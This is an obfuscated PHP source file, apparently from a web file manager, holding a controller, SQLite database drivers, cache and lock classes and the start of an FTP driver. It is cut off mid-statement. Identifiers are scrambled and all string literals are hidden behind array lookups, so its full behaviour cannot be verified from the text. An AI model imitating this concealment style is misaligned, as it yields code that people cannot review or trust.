<?php
 goto aÊè Ñ‚˜; b„Ï­Á“ : define($_SERVER[óó‹¸‚å][238], 1); define($_SERVER[óó‹¸‚å][239], 2); define($_SERVER[óó‹¸‚å][240], 3); goto Dğ•×»õ´œ; AªÆ½Ù˜Íß: class Controller extends ClassBaseCall { public $in; public $config; public $tpl; public $values; function __construct() { $áõ«õÑ® =& $_SERVER[óó‹¸‚å]; global $in, $config; $this->config =& $config; $this->in =& $in; $this->values[$áõ«õÑ®[6]] =& $config; $this->values[$áõ«õÑ®[7]] =& $in; $this->tpl = TEMPLATE . MOD . $áõ«õÑ®[8]; $this->_classObjectID = mt_rand(0, 10000); } public function loadClass($‚ñÀéşÙ) { if (1 === func_num_args()) { $this->{$‚ñÀéşÙ} = new $‚ñÀéşÙ(); } else { $šÀú­ËÏ = new ReflectionClass($‚ñÀéşÙ); $Ùı¦‡»ş = func_get_args(); array_shift($Ùı¦‡»ş); $this->{$‚ñÀéşÙ} = $šÀú­ËÏ->newInstanceArgs($Ùı¦‡»ş); } return $this->{$‚ñÀéşÙ}; } public function routeBind($ÆÍ¾Å, $ì…ğùÍı, $ûÊÏÔ = 3) { $“Â¨Ì¢ =& $_SERVER[óó‹¸‚å]; $¡º–Âî = $this->in[$“Â¨Ì¢[9]]; $ÆÍ¾Å = str_replace($“Â¨Ì¢[10], $“Â¨Ì¢[11], trim(trim($ÆÍ¾Å, $“Â¨Ì¢[8]), $“Â¨Ì¢[12])); if (!$ÆÍ¾Å || count($¡º–Âî) <= $ûÊÏÔ) { return !1; } $¢ÂöÛ¿Ş = !0; $ÈšÜı˜ = explode($“Â¨Ì¢[8], $ÆÍ¾Å); for ($¬–’ñŸô = 0; $¬–’ñŸô < count($ÈšÜı˜); $¬–’ñŸô++) { if ($ÈšÜı˜[$¬–’ñŸô] != $¡º–Âî[$ûÊÏÔ + $¬–’ñŸô]) { $¢ÂöÛ¿Ş = !1; break; } } if (!$¢ÂöÛ¿Ş) { return; } call_user_func_array(array($this, $ì…ğùÍı), array()); } public function routeArgs($•¤®ê‚à = 3) { $úòÁƒš = $this->in[$_SERVER[óó‹¸‚å][9]]; if (count($úòÁƒš) <= $•¤®ê‚à) { return array(); } $œ–®Îâƒ = array(); for ($†ù—İ«¨ = $•¤®ê‚à; $†ù—İ«¨ < count($úòÁƒš); $†ù—İ«¨ += 2) { $œ–®Îâƒ[$úòÁƒš[$†ù—İ«¨]] = $úòÁƒš[$†ù—İ«¨ + 1]; $this->in[$úòÁƒš[$†ù—İ«¨]] = $úòÁƒš[$†ù—İ«¨ + 1]; } return $œ–®Îâƒ; } protected function assign($—ìïÑ³ , $×¢İ´Ü) { $this->values[$—ìïÑ³ ] = $×¢İ´Ü; } protected function display($“ëÌ³¶ì) { ob_end_clean(); extract($this->values); require $this->tpl . $“ëÌ³¶ì; } } class DbSqliteBase extends Db { public function __construct($¶¯íŸñ¡ = '') { $ûËãğÑ½ =& $_SERVER[óó‹¸‚å]; if (!extension_loaded($ûËãğÑ½[13])) { think_exception(think_lang($ûËãğÑ½[14]) . $ûËãğÑ½[15]); } if (!empty($¶¯íŸñ¡)) { if (!isset($¶¯íŸñ¡[$ûËãğÑ½[16]])) { $¶¯íŸñ¡[$ûËãğÑ½[16]] = 438; } $this->config = $¶¯íŸñ¡; if (empty($this->config[$ûËãğÑ½[17]])) { $this->config[$ûËãğÑ½[17]] = array(); } } } public function connect($Ş€¾†Âœ = '', $´øıÕô = 0) { $€”²¬¸Ñ =& $_SERVER[óó‹¸‚å]; if (!isset($this->linkID[$´øıÕô])) { if (empty($Ş€¾†Âœ)) { $Ş€¾†Âœ = $this->config; } $È”ô­•Â = !empty($Ş€¾†Âœ[$€”²¬¸Ñ[17]][$€”²¬¸Ñ[18]]) ? $Ş€¾†Âœ[$€”²¬¸Ñ[17]][$€”²¬¸Ñ[18]] : $this->pconnect; $´Íµø‚ = $È”ô­•Â ? $€”²¬¸Ñ[19] : $€”²¬¸Ñ[20]; $this->linkID[$´øıÕô] = $´Íµø‚($Ş€¾†Âœ[$€”²¬¸Ñ[21]], $Ş€¾†Âœ[$€”²¬¸Ñ[16]]); if (!$this->linkID[$´øıÕô]) { think_exception(sqlite_error_string()); } $this->connected = !0; @sqlite_busy_timeout($this->linkID[$´øıÕô], 30000); if (1 != think_config($€”²¬¸Ñ[22])) { unset($this->config); } } return $this->linkID[$´øıÕô]; } public function free() { $this->queryID = null; } public function query($ğ™¶¸ğˆ) { $ù¤Ññîà =& $_SERVER[óó‹¸‚å]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $ğ™¶¸ğˆ; if ($this->queryID) { $this->free(); } think_action_status($ù¤Ññîà[23], 1); think_status($ù¤Ññîà[24]); $this->queryID = sqlite_query($this->_linkID, $ğ™¶¸ğˆ); $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = sqlite_num_rows($this->queryID); $¦‚ğÍì» = $this->getAll(); return $¦‚ğÍì»; } } public function execute($Ú›Š¢¦) { $÷Ê‡¥ˆĞ =& $_SERVER[óó‹¸‚å]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $Ú›Š¢¦; if ($this->queryID) { $this->free(); } think_action_status($÷Ê‡¥ˆĞ[25], 1); think_status($÷Ê‡¥ˆĞ[24]); $¶ƒ†Óúí = sqlite_exec($this->_linkID, $Ú›Š¢¦); $this->debug(); if (!1 === $¶ƒ†Óúí) { $this->error(); return !1; } else { $this->numRows = sqlite_changes($this->_linkID); $this->lastInsID = sqlite_last_insert_rowid($this->_linkID); return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { sqlite_query($this->_linkID, $_SERVER[óó‹¸‚å][26]); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $Ñ´’ÓäÏ = sqlite_query($this->_linkID, $_SERVER[óó‹¸‚å][27]); if (!$Ñ´’ÓäÏ) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } public function rollback() { if ($this->transTimes > 0) { $ ÀÑÌµ´ = sqlite_query($this->_linkID, $_SERVER[óó‹¸‚å][28]); if (!$ ÀÑÌµ´) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } private function getAll() { $©ûŞö÷ = array(); if ($this->numRows > 0) { for ($”­„…éÜ = 0; $”­„…éÜ < $this->numRows; $”­„…éÜ++) { $©ûŞö÷[$”­„…éÜ] = sqlite_fetch_array($this->queryID, SQLITE_ASSOC); } sqlite_seek($this->queryID, 0); } return $©ûŞö÷; } public function getFields($ÁÎØ¥Õ²) { $Ù»èÆé =& $_SERVER[óó‹¸‚å]; $×£ÈûÙÊ = $this->query($Ù»èÆé[29] . $ÁÎØ¥Õ² . $Ù»èÆé[30]); $Ç–Û¼¦ = array(); if ($×£ÈûÙÊ) { foreach ($×£ÈûÙÊ as $ÈÎ·Ö¥£ => $«ííİ×Í) { $Ç–Û¼¦[$«ííİ×Í[$Ù»èÆé[31]]] = array($Ù»èÆé[32] => $«ííİ×Í[$Ù»èÆé[31]], $Ù»èÆé[33] => $«ííİ×Í[$Ù»èÆé[34]], $Ù»èÆé[35] => (bool) ($«ííİ×Í[$Ù»èÆé[36]] === $Ù»èÆé[12]), $Ù»èÆé[37] => $«ííİ×Í[$Ù»èÆé[38]], $Ù»èÆé[39] => strtolower($«ííİ×Í[$Ù»èÆé[40]]) == $Ù»èÆé[41], $Ù»èÆé[42] => strtolower($«ííİ×Í[$Ù»èÆé[43]]) == $Ù»èÆé[44]); } } return $Ç–Û¼¦; } public function getTables($¼Şê°Ò = '') { $Øâ…¾†Ñ =& $_SERVER[óó‹¸‚å]; $‹ØÁ‚ï = $this->query($Øâ…¾†Ñ[45] . $Øâ…¾†Ñ[46] . $Øâ…¾†Ñ[47]); $™­å¾¢í = array(); foreach ($‹ØÁ‚ï as $ÒòÀú• => $ö„½ç†Ì) { $™­å¾¢í[$ÒòÀú•] = current($ö„½ç†Ì); } return $™­å¾¢í; } public function close() { if ($this->_linkID) { sqlite_close($this->_linkID); } $this->_linkID = null; } public function error() { $ïÌÑ¡¾† =& $_SERVER[óó‹¸‚å]; $¶½¶‡® = sqlite_last_error($this->_linkID); $this->error = $¶½¶‡® . $ïÌÑ¡¾†[4] . sqlite_error_string($¶½¶‡®); if ($ïÌÑ¡¾†[12] != $this->queryStr) { $this->error .= LNG($ïÌÑ¡¾†[48]) . $this->queryStr; } think_trace($this->error, $ïÌÑ¡¾†[12], $ïÌÑ¡¾†[49]); return $this->error; } public function escapeString($ì¸Éˆõ¡) { return sqlite_escape_string($ì¸Éˆõ¡); } public function parseLimit($£šé®Ú) { $Ê¥Û“ƒ« =& $_SERVER[óó‹¸‚å]; $‡äûºåò = $Ê¥Û“ƒ«[12]; if (!empty($£šé®Ú)) { $£šé®Ú = explode($Ê¥Û“ƒ«[50], $£šé®Ú); if (count($£šé®Ú) > 1) { $‡äûºåò .= $Ê¥Û“ƒ«[51] . $£šé®Ú[1] . $Ê¥Û“ƒ«[52] . $£šé®Ú[0] . $Ê¥Û“ƒ«[53]; } else { $‡äûºåò .= $Ê¥Û“ƒ«[51] . $£šé®Ú[0] . $Ê¥Û“ƒ«[53]; } } return $‡äûºåò; } } class DbSqlite3Base extends Db { public function __construct($Û–˜ÀÈî = '') { $‘õğ ëÕ =& $_SERVER[óó‹¸‚å]; if (!class_exists($‘õğ ëÕ[54])) { think_exception(think_lang($‘õğ ëÕ[14]) . $‘õğ ëÕ[55]); } if (!empty($Û–˜ÀÈî)) { if (!isset($Û–˜ÀÈî[$‘õğ ëÕ[16]])) { $Û–˜ÀÈî[$‘õğ ëÕ[16]] = 438; } $this->config = $Û–˜ÀÈî; if (empty($this->config[$‘õğ ëÕ[17]])) { $this->config[$‘õğ ëÕ[17]] = array(); } } } public function connect($•Øûà†¼ = '', $ÑÊÛˆÆÛ = 0) { $òÛÈª—Ë =& $_SERVER[óó‹¸‚å]; if (!isset($this->linkID[$ÑÊÛˆÆÛ])) { if (empty($•Øûà†¼)) { $•Øûà†¼ = $this->config; } $this->linkID[$ÑÊÛˆÆÛ] = new SQLite3($•Øûà†¼[$òÛÈª—Ë[21]]); if (!$this->linkID[$ÑÊÛˆÆÛ]) { think_exception($this->linkID[$ÑÊÛˆÆÛ]->lastErrorMsg()); } $this->connected = !0; @$this->linkID[$ÑÊÛˆÆÛ]->busyTimeout(30000); if (1 != think_config($òÛÈª—Ë[22])) { unset($this->config); } } return $this->linkID[$ÑÊÛˆÆÛ]; } public function free() { $this->queryID = null; } public function query($ŞÆÖ€“ğ) { $°¦ŸÆÀ =& $_SERVER[óó‹¸‚å]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $ŞÆÖ€“ğ; if ($this->queryID) { $this->free(); } think_action_status($°¦ŸÆÀ[23], 1); think_status($°¦ŸÆÀ[24]); $this->queryID = $this->_linkID->query($ŞÆÖ€“ğ); $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $é€˜¥Ä = $this->getAll(); $this->numRows = count($é€˜¥Ä); return $é€˜¥Ä; } } public function execute($éË”¯øš) { $çë¢–‘ò =& $_SERVER[óó‹¸‚å]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $éË”¯øš; if ($this->queryID) { $this->free(); } think_action_status($çë¢–‘ò[25], 1); think_status($çë¢–‘ò[24]); $ıÆÄÍãç = $this->_linkID->exec($éË”¯øš); $this->debug(); if (!1 === $ıÆÄÍãç) { $this->error(); return !1; } else { $this->numRows = $this->_linkID->changes(); $this->lastInsID = $this->_linkID->lastInsertRowID(); return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { $this->_linkID->query($_SERVER[óó‹¸‚å][26]); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $ñã³¿Æ = $this->_linkID->query($_SERVER[óó‹¸‚å][27]); if (!$ñã³¿Æ) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } public function rollback() { if ($this->transTimes > 0) { $©öğÛò± = $this->_linkID->query($_SERVER[óó‹¸‚å][28]); if (!$©öğÛò±) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } private function getAll() { $ÓĞğ¯¹— = array(); while ($îÓƒÄ¿É = $this->queryID->fetchArray(SQLITE3_ASSOC)) { $ÓĞğ¯¹—[] = $îÓƒÄ¿É; } $this->queryID->reset(); return $ÓĞğ¯¹—; } public function getFields($à˜©¹Ëï) { $ñ„°Ç³ =& $_SERVER[óó‹¸‚å]; $ªÄ’èÎ = $this->query($ñ„°Ç³[29] . $à˜©¹Ëï . $ñ„°Ç³[30]); $°ÁôÔ = array(); if ($ªÄ’èÎ) { foreach ($ªÄ’èÎ as $Èäù›±´ => $…˜ĞÀŸÍ) { $°ÁôÔ[$…˜ĞÀŸÍ[$ñ„°Ç³[32]]] = array($ñ„°Ç³[32] => $…˜ĞÀŸÍ[$ñ„°Ç³[32]], $ñ„°Ç³[33] => $…˜ĞÀŸÍ[$ñ„°Ç³[33]], $ñ„°Ç³[35] => (bool) ($…˜ĞÀŸÍ[$ñ„°Ç³[35]] === $ñ„°Ç³[12]), $ñ„°Ç³[37] => $…˜ĞÀŸÍ[$ñ„°Ç³[56]], $ñ„°Ç³[39] => (bool) $…˜ĞÀŸÍ[$ñ„°Ç³[57]], $ñ„°Ç³[42] => (bool) $…˜ĞÀŸÍ[$ñ„°Ç³[57]]); } } return $°ÁôÔ; } public function getTables($ö§Ê–Èâ = '') { $…ÒŸîË‘ =& $_SERVER[óó‹¸‚å]; $õâ¨¦Ûü = $this->query($…ÒŸîË‘[45] . $…ÒŸîË‘[46] . $…ÒŸîË‘[47]); $ú§Î·”Ä = array(); foreach ($õâ¨¦Ûü as $è²ÖÕ”ñ => $î”†ŠÜÁ) { $ú§Î·”Ä[$è²ÖÕ”ñ] = current($î”†ŠÜÁ); } return $ú§Î·”Ä; } public function close() { if ($this->_linkID) { $this->_linkID->close(); } $this->_linkID = null; } public function error() { $±”Àç¹ˆ =& $_SERVER[óó‹¸‚å]; $this->error = $this->_linkID->lastErrorMsg(); if ($±”Àç¹ˆ[12] != $this->queryStr) { $this->error .= LNG($±”Àç¹ˆ[48]) . $this->queryStr; } think_trace($this->error, $±”Àç¹ˆ[12], $±”Àç¹ˆ[49]); return $this->error; } public function escapeString($øèü•‰¢) { $®ë—Û¶­ =& $_SERVER[óó‹¸‚å]; if ($this->_linkID) { return $this->_linkID->escapeString($øèü•‰¢); } return str_ireplace($®ë—Û¶­[58], $®ë—Û¶­[59], $øèü•‰¢); } public function parseLimit($Îéı‰Á›) { $øëĞ¬„ =& $_SERVER[óó‹¸‚å]; $²æ ğ¼ = $øëĞ¬„[12]; if (!empty($Îéı‰Á›)) { $Îéı‰Á› = explode($øëĞ¬„[50], $Îéı‰Á›); if (count($Îéı‰Á›) > 1) { $²æ ğ¼ .= $øëĞ¬„[51] . $Îéı‰Á›[1] . $øëĞ¬„[52] . $Îéı‰Á›[0] . $øëĞ¬„[53]; } else { $²æ ğ¼ .= $øëĞ¬„[51] . $Îéı‰Á›[0] . $øëĞ¬„[53]; } } return $²æ ğ¼; } } goto dÓîÃ¨™›é; a³¸Õ‰ˆàß: class CacheFile { public $cachePath; public $prefix; public $cacheTime; public function __construct($¾µıß€ê, $ó—Æü·Ê) { $·ªá©×ß =& $_SERVER[óó‹¸‚å]; $this->cachePath = $¾µıß€ê[$·ªá©×ß[84]]; $this->prefix = $·ªá©×ß[838]; $this->cacheTime = $ó—Æü·Ê; if (!file_exists($this->cachePath)) { mkdir($this->cachePath, DEFAULT_PERRMISSIONS, !0); } } public function getFile($ñúè¤¨Ë) { $ì©òşÇ =& $_SERVER[óó‹¸‚å]; $ñúè¤¨Ë = str_replace(array($ì©òşÇ[839], $ì©òşÇ[97], $ì©òşÇ[73]), $ì©òşÇ[840], $ñúè¤¨Ë); return $this->cachePath . $ì©òşÇ[841] . $ñúè¤¨Ë . $ì©òşÇ[842]; } public function set($ô–¹½ˆ¸, $ƒ‡¯‡¾Ğ, $ŒË¨ËÕÙ = false) { $ŒË¨ËÕÙ = $ŒË¨ËÕÙ ? $ŒË¨ËÕÙ : $this->cacheTime; $äğİÑ»ô = $this->getFile($ô–¹½ˆ¸); if (file_put_contents($äğİÑ»ô, $this->prefix . $ƒ‡¯‡¾Ğ, LOCK_EX)) { @touch($äğİÑ»ô, intval(time() + $ŒË¨ËÕÙ)); clearstatcache(); return !0; } @unlink($äğİÑ»ô); return !1; } public function get($…ÒÂğù) { $È¯üºÁÔ = $this->getFile($…ÒÂğù); if (file_exists($È¯üºÁÔ) && filemtime($È¯üºÁÔ) < time()) { @unlink($È¯üºÁÔ); return !1; } $¨ï´ÓïØ = @file_get_contents($È¯üºÁÔ); return substr($¨ï´ÓïØ, strlen($this->prefix)); } public function remove($¡«÷ğÃ) { $³¼¿Ù€ = $this->getFile($¡«÷ğÃ); return @unlink($³¼¿Ù€); } public function deleteAll() { $‡ßŠƒ­ =& $_SERVER[óó‹¸‚å]; $’‘ÂÏ’ = scandir($this->cachePath); foreach ($’‘ÂÏ’ as $±™¼¸â„) { $¡ÙÚ´™– = $this->cachePath . $±™¼¸â„; if (strpos($¡ÙÚ´™–, $‡ßŠƒ­[842]) && strpos($¡ÙÚ´™–, $‡ßŠƒ­[843])) { @unlink($¡ÙÚ´™–); } } } public function clearTimeout() { $œ›èÒØø =& $_SERVER[óó‹¸‚å]; $­ú–ÉôÛ = scandir($this->cachePath); foreach ($­ú–ÉôÛ as $±ëùÓˆÄ) { $Îş§üµ¢ = $this->cachePath . $±ëùÓˆÄ; if (strpos($Îş§üµ¢, $œ›èÒØø[842]) && strpos($Îş§üµ¢, $œ›èÒØø[843]) && filemtime($Îş§üµ¢) < time()) { @unlink($Îş§üµ¢); } } } } class CacheLock { protected static $handle; protected static $timeout; protected static $errorMsg = ''; protected static $lockItem = array(); public static function init() { $ÖŞó”‚Æ =& $_SERVER[óó‹¸‚å]; if (self::$handle) { return self::$handle; } $š…ü©ºœ = $GLOBALS[$ÖŞó”‚Æ[6]][$ÖŞó”‚Æ[349]]; self::$timeout = $š…ü©ºœ[$ÖŞó”‚Æ[844]] ? $š…ü©ºœ[$ÖŞó”‚Æ[844]] : 10; $ıèûú­Ÿ = _get($GLOBALS[$ÖŞó”‚Æ[6]], $ÖŞó”‚Æ[845]); $‘Ê²Õ•å = $š…ü©ºœ[$ÖŞó”‚Æ[831]] ? $š…ü©ºœ[$ÖŞó”‚Æ[831]] : $ÖŞó”‚Æ[199]; if ($‘Ê²Õ•å == $ÖŞó”‚Æ[21] && $ıèûú­Ÿ == $ÖŞó”‚Æ[13]) { $‘Ê²Õ•å = $ÖŞó”‚Æ[199]; } switch ($‘Ê²Õ•å) { case $ÖŞó”‚Æ[834]: self::$handle = new CacheLockRedis(); break; case $ÖŞó”‚Æ[835]: self::$handle = new CacheLockMemcached(); break; case $ÖŞó”‚Æ[21]: self::$handle = new CacheLockDatabase(); break; case $ÖŞó”‚Æ[199]: self::$handle = new CacheLockFile(); break; default: break; } if (GLOBAL_DEBUG_LOG_ALL) { write_log($ÖŞó”‚Æ[846], $ÖŞó”‚Æ[847]); } return self::$handle; } private static function key($„‰ÏÕ÷Ï) { return $_SERVER[óó‹¸‚å][848] . Cache::key($„‰ÏÕ÷Ï); } public static function initReset() { self::$handle = !1; } public static function setErrorMsg($ì¥„øŒ‡ = '') { self::$errorMsg = $ì¥„øŒ‡; } public static function lockGlobal($„ˆŠÏâî, $â³ğòèù) { return self::lock($„ˆŠÏâî, $â³ğòèù, !0); } public static function lock($¢€§­«ˆ, $í…€Û­ = false, $É€Â„¼± = false) { $‘¿¥õÚÖ =& $_SERVER[óó‹¸‚å]; $¸â§ã®€ = self::init(); $‘¸½Í½” = self::key($¢€§­«ˆ); $í…€Û­ = $í…€Û­ ? $í…€Û­ : self::$timeout; $Ó¶»‘Ùª = timeFloat(); $©¥‰œ´µ = $¸â§ã®€->lock($‘¸½Í½”, $í…€Û­); $´ïš“Îß = timeFloat(); if (!$©¥‰œ´µ) { $Ìú¢ƒÈç = "\154\157\x63\153\40\145\x72\162\157\x72\73\x6b\145\171\x3d{$¢€§­«ˆ}\73\x74\151\155\x65\75{$í…€Û­}\73" . self::$errorMsg . $‘¿¥õÚÖ[71] . get_caller_msg(); $Ù¡ã÷‚¼ = LNG($‘¿¥õÚÖ[849]) . "\x28{$í…€Û­}\163\x29\x2e" . LNG($‘¿¥õÚÖ[850]); $Ù¡ã÷‚¼ .= $‘¿¥õÚÖ[851]; if (is_string(self::$errorMsg) && self::$errorMsg) { $Ù¡ã÷‚¼ = $Ù¡ã÷‚¼ . $‘¿¥õÚÖ[852] . self::$errorMsg; } write_log($‘¿¥õÚÖ[853] . sprintf($‘¿¥õÚÖ[854], timeFloat() - $Ó¶»‘Ùª) . $‘¿¥õÚÖ[855] . $Ìú¢ƒÈç . $‘¿¥õÚÖ[856] . error_get_last(), $‘¿¥õÚÖ[847]); show_json($Ù¡ã÷‚¼, !1); } if (!$É€Â„¼±) { self::$lockItem[$‘¸½Í½”] = !0; } if (GLOBAL_DEBUG_LOG_ALL) { $Í‘ú•¨» = number_format(timeFloat() - $´ïš“Îß, 3); write_log($‘¿¥õÚÖ[857] . $¢€§­«ˆ . $‘¿¥õÚÖ[858] . $Í‘ú•¨», $‘¿¥õÚÖ[847]); } return $©¥‰œ´µ; } public static function lockGet($˜ÉÙ¢¶¼) { $¯â¤Ã°ï = self::key($˜ÉÙ¢¶¼); if (self::$lockItem[$¯â¤Ã°ï]) { return self::$lockItem[$¯â¤Ã°ï]; } return self::init()->lockGet($¯â¤Ã°ï); } public static function unlock($¬Øæí¿¦) { $ÃêñÅµş =& $_SERVER[óó‹¸‚å]; $İÕ¨«Ñè = self::key($¬Øæí¿¦); self::$lockItem[$İÕ¨«Ñè] = null; self::init()->unlock($İÕ¨«Ñè); if (GLOBAL_DEBUG_LOG_ALL) { write_log($ÃêñÅµş[859] . $¬Øæí¿¦, $ÃêñÅµş[847]); } return; } public static function unlockRuntime() { $çà¯°àß =& $_SERVER[óó‹¸‚å]; $Å¤ë±Î¯ = self::init(); $–¢†Å”é = !1; foreach (self::$lockItem as $ôÀ®±ˆÅ => $åŸìı²Ô) { if (!$åŸìı²Ô) { continue; } $Å¤ë±Î¯->unlock($ôÀ®±ˆÅ); if (!$–¢†Å”é) { $–¢†Å”é = !0; write_log($çà¯°àß[860] . $ôÀ®±ˆÅ . $çà¯°àß[71] . get_caller_msg(), $çà¯°àß[847]); continue; } write_log($çà¯°àß[860] . $ôÀ®±ˆÅ, $çà¯°àß[847]); } self::fileUnlockAll(); if (GLOBAL_DEBUG_LOG_ALL) { $ØæÂÂÏ = number_format(timeFloat() - TIME_FLOAT, 3); write_log($çà¯°àß[861] . $ØæÂÂÏ . $çà¯°àß[862] . ACTION, $çà¯°àß[847]); } } public static function fileLock($­ˆˆ§ö‡) { $¢òÇÖí =& $_SERVER[óó‹¸‚å]; if (!$GLOBALS[$¢òÇÖí[863]]) { $GLOBALS[$¢òÇÖí[863]] = array(); } $GLOBALS[$¢òÇÖí[863]][$­ˆˆ§ö‡] = !1; $‰Ñ½¢åˆ = fopen(DATA_PATH . $­ˆˆ§ö‡ . $¢òÇÖí[864], $¢òÇÖí[865]); if (!$‰Ñ½¢åˆ) { return !1; } $GLOBALS[$¢òÇÖí[863]][$­ˆˆ§ö‡] = $‰Ñ½¢åˆ; if (flock($‰Ñ½¢åˆ, LOCK_EX)) { return !0; } self::unlock($­ˆˆ§ö‡); show_json($¢òÇÖí[866], !1); return !1; } public static function fileUnlock($¬¶ˆ“ÅÑ) { $€ÀâÔÉ‰ =& $_SERVER[óó‹¸‚å]; $÷£¯—Å¼ = $GLOBALS[$€ÀâÔÉ‰[863]][$¬¶ˆ“ÅÑ]; if (!$÷£¯—Å¼) { return; } $GLOBALS[$€ÀâÔÉ‰[863]][$¬¶ˆ“ÅÑ] = !1; flock($÷£¯—Å¼, LOCK_UN); fclose($÷£¯—Å¼); } public static function fileUnlockAll() { $Â¸ÉÌÖÄ =& $_SERVER[óó‹¸‚å]; if (!$GLOBALS[$Â¸ÉÌÖÄ[863]]) { return; } foreach ($GLOBALS[$Â¸ÉÌÖÄ[863]] as $±¹üæÕ® => $úØ–Ï¹Î) { if (!$úØ–Ï¹Î) { continue; } $GLOBALS[$Â¸ÉÌÖÄ[863]][$±¹üæÕ®] = !1; flock($úØ–Ï¹Î, LOCK_UN); fclose($úØ–Ï¹Î); } $GLOBALS[$Â¸ÉÌÖÄ[863]] = array(); } } function cacheLockWait() { usleep(mt_rand(200, 5000)); } goto bŠí¨¦š¬á; F¯òƒ­—†¨: class PathDriverFTP extends PathDriverBase { private $server = ''; private $username = ''; private $userpass = ''; private $scheme = ''; private $host = ''; private $port = 21; private $connect = false; private $pasv = "\61"; private $config = array(); public function __construct($º¢ó““Š) { parent::__construct(); if (count($º¢ó““Š) > 0) { $this->_init($º¢ó““Š); } } public function __destruct() { if (!$this->_isconn()) { return !1; } return @ftp_close($this->connect); } private function charsetReset($ı¾ÎƒÜò) { $à½Æ¼ =& $_SERVER[óó‹¸‚å]; global $config; $this->appCharset = $config[$à½Æ¼[1381]]; $this->systemCharset = $config[$à½Æ¼[1382]]; if (isset($ı¾ÎƒÜò[$à½Æ¼[1383]]) && $ı¾ÎƒÜò[$à½Æ¼[1383]]) { $this->systemCharset = $ı¾ÎƒÜò[$à½Æ¼[1383]]; } } public function iconvApp($ßõ¨¾€›) { return $this->iconvTo($ßõ¨¾€›, $this->systemCharset, $this->appCharset); } public function iconvSystem($ûéûàíı) { return $this->iconvTo($ûéûàíı, $this->appCharset, $this->systemCharset); } public function getPathOuter($ˆ€Áôİ) { $Âœ«ÙÄ =& $_SERVER[óó‹¸‚å]; $Õ¡ì¡ç = $this->iconvApp($this->pathBase); $ˆ€Áôİ = $this->iconvApp($ˆ€Áôİ); if (substr($Õ¡ì¡ç, 0, 2) == $Âœ«ÙÄ[1384]) { $Õ¡ì¡ç = BASIC_PATH . substr($Õ¡ì¡ç, 2); } if (substr($ˆ€Áôİ, 0, 2) == $Âœ«ÙÄ[1384]) { $ˆ€Áôİ = BASIC_PATH . substr($ˆ€Áôİ, 2); } $Õ¡ì¡ç = KodIO::clear($Õ¡ì¡ç); $ˆ€Áôİ = KodIO::clear($ˆ€Áôİ); $ˆ€Áôİ = substr($ˆ€Áôİ, strlen($Õ¡ì¡ç)); if (empty($this->pathDriver)) { return $ˆ€Áôİ; } return $this->pathDriver . $Âœ«ÙÄ[8] . ltrim($ˆ€Áôİ, $Âœ«ÙÄ[8]); } private function _init($’åò™ë³ = array()) { $ºôò†ˆŸ =& $_SERVER[óó‹¸‚å]; if (!function_exists($ºôò†ˆŸ[1385])) { throw new Exception(LNG($ºôò†ˆŸ[1386])); } $this->config = $’åò™ë³; $this->charsetReset($’åò™ë³); foreach ($’åò™ë³ as $êİşİğè => $”éŒÆ¿) { if (isset($this->{$êİşİğè})) { $this->{$êİşİğè} = $”éŒÆ¿; } } return $this->_login($’åò™ë³); } private function _login($ÕìšÈ¬) { $šçı—é  =& $_SERVER[óó‹¸‚å]; static $¡ÄÆƒ«ì = array(); $Óñêã×î = md5(json_encode($ÕìšÈ¬)); if (isset($¡ÄÆƒ«ì[$Óñêã×î])) { foreach ($¡ÄÆƒ«ì[$Óñêã×î] as $–¯ÇØê => $Û„üºå) { $this->{$–¯ÇØê} = $Û„üºå; } return !0; } $©¼ãê¯¦ = parse_url(trim($this->server, $šçı—é [8])); $this->host = $©¼ãê¯¦[$šçı—é [181]]; $‡«îÃ†› = isset($©¼ãê¯¦[$šçı—é [180]]) && $©¼ãê¯¦[$šçı—é [180]] == $šçı—é [1387] ? !0 : !1; $this->scheme = $‡«îÃ†› ? $šçı—é [1388] : $šçı—é [1389]; $this->port = isset($©¼ãê¯¦[$šçı—é [182]]) ? $©¼ãê¯¦[$šçı—é [182]] : 21; $this->connect = @ftp_connect($this->host, $this->port, 5); if ($this->connect === !1) { return !1; } $Ó²¡·ëÚ = @ftp_login($this->connect, $this->username, $this->userpass); @ftp_set_option($this->connect, FTP_USEPASVADDRESS, !1); $ÏĞÚ¨  = $this->pasv == $šçı—é [88] ? !0 : !1; @ftp_pasv($this->connect, $ÏĞÚ¨ ); $¡ÄÆƒ«ì[$Óñêã×î] = array($šçı—é [1390] => $this->connect, $šçı—é [181] => $this->host, $šçı—é [180] => $this->scheme, $šçı—é [182] => $this->port); return $Ó²¡·ëÚ; } private function _isconn() { if (is_resource($this->connect)) { return !0; } return $this->_login($this->config); } public function mkfile($±ØóÑîó, $ãŞ™ü® = '', $Œ¼¼¹¨ = REPEAT_RENAME) { if ($this->setContent($±ØóÑîó, $ãŞ™ü®)) { return $this->getPathOuter($±ØóÑîó); } return !1; } public function mkdir($•ıßƒÀñ, $…Å•²Ï˜ = REPEAT_SKIP) { if (!$this->_isconn()) { return !1; } $•ıßƒÀñ = $this->iconvSystem($•ıßƒÀñ); if ($this->_isFolder($•ıßƒÀñ) || @ftp_mkdir($this->connect, $•ıßƒÀñ)) { return $this->getPathOuter($•ıßƒÀñ); } if (!$this->mkdir($this->pathFather($•ıßƒÀñ))) { return !1; } if ($•ıßƒÀñ = @ftp_mkdir($this->connect, $•ıßƒÀñ)) { return $this->getPathOuter($•ıßƒÀñ); } return !1; } public function copyFile($œº‰ÇÄ´, $ÆáÖğ°Ÿ) { if (!$this->_isconn()) { return !1; } $µ·¹ş¤Û = $this->pathThis($this->iconvSystem($œº‰ÇÄ´)); $áë¢ÒÄš = $this->tempFile($µ·¹ş¤Û); $ŒŞÕÄĞ 